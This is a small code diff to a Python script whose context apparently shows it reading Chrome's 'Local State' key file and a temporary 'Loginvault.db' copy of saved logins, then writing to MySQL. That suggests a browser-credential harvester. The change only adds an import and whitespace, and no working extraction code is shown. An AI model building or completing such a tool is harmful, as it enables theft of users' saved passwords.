@@ -11,6 +11,7 @@ import shutil
 import csv
 import mysql.connector
 import mysql.connector.plugins.caching_sha2_password
+import mysql.connector.plugins.mysql_native_password
 
 #GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
@@ -174,5 +175,6 @@ if __name__ == '__main__':
                 conn.close()
                 #Delete temp login db
                 os.remove("Loginvault.db")
+        
     except Exception as e:
         print("[ERR] %s"%str(e))
